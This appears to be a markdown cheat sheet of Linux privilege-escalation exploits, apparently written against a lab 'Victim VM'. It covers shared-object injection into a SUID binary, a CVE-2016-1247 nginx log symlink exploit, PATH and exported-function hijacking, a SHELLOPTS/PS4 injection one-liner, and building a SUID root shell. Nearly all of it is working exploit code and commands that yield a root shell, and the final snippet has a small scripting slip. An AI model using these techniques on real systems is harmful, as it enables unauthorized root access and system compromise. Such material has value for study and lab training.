## Shared Object Injection
### Victim VM
```bash
$ find / -type f -perm -04000 -ls 2>/dev/null
	816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
	816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
	816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2

$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
	access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
	open("/etc/ld.so.cache", O_RDONLY)      = 3
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	open("/lib/libdl.so.2", O_RDONLY)       = 3
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	open("/lib/libm.so.6", O_RDONLY)        = 3
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	open("/lib/libc.so.6", O_RDONLY)        = 3
	open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
	
$ mkdir /home/user/.config
$ cd /home/user/.config
$ nano libcalc.c
```
#### Exploit Code
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
```bash
$ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
$ /usr/local/bin/suid-so
```
---
## Symlinks
### Victim VM
```bash
$ dpkg -l | grep nginx
	ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files	# <- CVE-2016-1247
	ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)
$ /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log	# <- CVE-2016-1247
```
**Check if is enabled as root(crontab,jobs,etc)**
invoke-rc.d nginx rotate >/dev/null 2>&1
---
## Environment Variables #1 
### Victim VM
```bash
$ find / -type f -perm -04000 -ls 2>/dev/null
	816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env

$ strings /usr/local/bin/suid-env
	/lib64/ld-linux-x86-64.so.2
	5q;Xq
	[...SNIP...]
	service apache2 start	# <- Vulnerable
	
$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
$ gcc /tmp/service.c -o /tmp/service
$ export PATH=/tmp:$PATH
$ /usr/local/bin/suid-env
```

## Environment Variables #2
```bash
$ find / -type f -perm -04000 -ls 2>/dev/null
	816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2

$ strings /usr/local/bin/suid-env2
	/lib64/ld-linux-x86-64.so.2
	[...SNIP...]
	/usr/sbin/service apache2 start	# <- Vulnerable
```
### Exploitation Method #1
```bash
$ function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
$ export -f /usr/sbin/service
$ /usr/local/bin/suid-env2
```
### Exploitation Method #2
```bash
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```
---
To create our own SUID binary
```bash
$ print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
$ gcc -o /tmp/suid /tmp/suid.c  
$ sudo chmod +x /tmp/suid 
$ sudo chmod +s /tmp/suid
```